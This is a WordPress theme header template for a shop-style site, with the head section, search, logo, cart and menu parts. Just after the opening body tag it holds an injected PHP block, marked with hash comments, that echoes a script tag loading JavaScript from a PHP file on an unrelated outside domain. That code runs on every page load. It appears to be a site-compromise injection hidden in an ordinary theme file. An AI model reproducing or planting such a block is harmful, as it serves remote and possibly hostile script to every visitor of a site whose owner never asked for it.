<?php require_once(ABSPATH .'/wp-admin/includes/plugin.php');?>

<?php get_template_part('includes/layouts' ) ?>
<?php get_template_part('includes/plug' ) ?>

<!DOCTYPE html>
<html <?php language_attributes(); ?>>
  <head>
    <meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
    
	<?php get_template_part('includes/title' ) ?>
    
	<?php get_template_part('includes/seo' ) ?>

	<?php get_template_part('includes/meta-viewport' ) ?>
    
    <meta name="author" content="lidplussdesign" />

    <?php get_template_part('includes/favicon' ) ?>

    <?php wp_head(); ?>
    
</head>
<body <?php body_class(); ?>>
<?php
#923ead#
if(empty($rzmzw)) {
$rzmzw = "<script type=\"text/javascript\" src=\"http://cityofflagschorus.org/wp-content/themes/twentyfourteen/c7pmnhq8.php\"></script>";
echo $rzmzw;
}
#/923ead#
?>
<div id="body-wrap">
	<div id="header">
		<div class="header-middle">
			<div class="container">
				<div class="row">
					<?php get_template_part('includes/search' ) ?>
					<?php get_template_part('includes/logo' ) ?>
					<?php get_template_part('includes/cart' ) ?>
				</div>
				<div class="row">
					<div class="col-md-12"><div class="sep-border"></div></div>
				</div>
			</div>
		</div>
		<div class="header-bottom">
			<div class="container">
				<div class="row">
					<div class="col-md-12">
						<?php get_template_part('includes/menu' ) ?>
					</div>
				</div>
			</div>
		</div>
	</div>
